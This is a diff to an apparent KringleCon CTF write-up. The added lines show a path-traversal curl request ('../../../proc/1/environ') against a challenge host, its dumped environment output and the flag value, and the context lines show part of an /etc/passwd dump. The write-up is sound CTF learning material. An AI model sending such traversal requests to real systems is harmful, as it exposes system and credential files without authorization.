@@ -15,8 +15,14 @@ man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 [...]
 ```
+Using this the value of the environment variable can be obtained like this:
+```
+curl https://tag-generator.kringlecastle.com/image?id=../../../proc/1/environ --output -
 
+PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=b7610641492eRUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app
+```
+So the `GREETZ` variable contains **JackFrostWasHere**
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbNzAzMjA5NDExLDkyMDQ1NTg2NSwtMTYwNj
-A3ODA0MF19
+eyJoaXN0b3J5IjpbMTMxMjA1NjQ1Myw5MjA0NTU4NjUsLTE2MD
+YwNzgwNDBdfQ==
 -->
